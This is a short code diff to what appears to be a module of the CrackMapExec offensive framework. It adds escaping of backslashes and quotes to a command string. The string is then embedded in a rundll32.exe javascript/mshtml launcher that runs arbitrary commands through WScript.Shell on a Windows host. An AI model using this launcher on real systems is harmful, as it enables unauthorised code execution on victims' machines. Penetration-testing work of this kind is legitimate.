@@ -40,6 +40,10 @@ class CMEModule:
                 self.command = cmdfile.read().strip()
 
     def launcher(self, context, command):
+        command = command.replace('\\', '\\\\')
+        command = command.replace('"', '\\"')
+        command = command.replace("'", "\\'")
+
         launcher = 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("{}");'.format(command)
         return launcher
 
